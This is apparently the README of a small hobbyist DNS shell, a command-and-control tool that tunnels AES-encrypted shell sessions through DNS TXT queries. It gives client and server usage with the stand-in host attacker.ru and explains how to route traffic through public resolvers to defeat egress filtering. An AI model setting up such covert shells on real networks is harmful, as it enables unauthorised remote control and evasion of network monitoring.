# DNS Shell

## Introduction
This is a simple dns shell. I've gone to a few security talks lately, and it seems to me people talk of dns shells like they are new and hip...yet they've been around since the late 90's...is it just me who has heard of these for years?

Anyways, this is a pretty simple shell setup. It contains a custom DNS server that sits and listens for TXT request from a custom DNS client.

The shell implementation is pretty ghetto (kind of on purpose...script kiddies need to do some work on their part...).

All comms are encrypted with AES128 with padding and a nonce-based iv (might be insecure...space for cnc is pretty small...hence why it's AES128 instead of AES256 or higher). At some point I'd like to add a layer of asymmetric encrypt to ensure authenticity with the server and that way a private key wouldn't need to be provided on the client side of things.

The nonce system is kind of a mess. I was too lazy to implement a full nonce based resending system...so I just added a delay between sending packets to "hope" they arrive in order...it's on the todo...

Single client only (multiple clients are going to do some weird things...).

Made this just to do it myself...iodine and dnscat are way better than this...

Educational use intended...don't break the law and say I didn't say you shouldn't...

## Usage
This can be used in two ways - the dumb way and the smart way.

#### Dumb way
The dumb way is simply setting up a server and using it like so:

On the server:
```
$ ./server.py
Password:
DNS Serverpress enter for "0.0.0.0":
DNS Port (press enter for 53):
ls -a
.
..
folder_1
...
```

On client:
```
$ ./client.py
Password:
Root (i.e. ".attacker.ru" without quotes): .attacker.ru
DNS Server: attacker.ru
DNS Port (press enter for 53):
```

The dumb way can be stopped by egress filtering on client machines. The smart way is a little more resilient.

#### Smart way
The smart way is to create an NS record on an internet nameservice (like GoDaddy, Namecheap, etc...). Set this to a subdomain (usually can't make a NS on your root domain on these types of systems). I'm going to use `.cnc.attacker.ru` as an example. You are also going to need to setup a server on an internet accessible machine, and give it an A record to `cnc.attacker.ru`. Any DNS requests for `*.cnc.attacker.ru` from clients can now go to an internet DNS (say `8.8.8.8`), which will query `cnc.attacker.ru`, which will send replies back to `8.8.8.8`, which will go back to the client. Egress filtering defeated...

```
$ ./server.py
Password:
DNS Serverpress enter for "0.0.0.0":
DNS Port (press enter for 53):
ls -a
.
..
folder_1
...
```

On client:
```
$ ./client.py
Password:
Root (i.e. ".attacker.ru" without quotes): .cnc.attacker.ru
DNS Server: 8.8.8.8
DNS Port (press enter for 53):
```

## Files
`alpha.py`		- Arbitrary(ish) encoding system.
`b62.py`		- Base62 encoder using alpha.py.
`client.py`		- Client (aka shell).
`cnc.py`		- Non-blocking command line interface.
`crypt.py`		- Encryption scheme (AES128).
`server.py`		- Server (aka shell handler).
`session.py`	- DNS session handler (has a session number that isn't used at the moment...)
`util.py`		- Random utility functions needed.

## Closing
Summary: Simple liitle dns shell with encrypted comms that still needs a lot of work...but it served its purpose...

That's it...
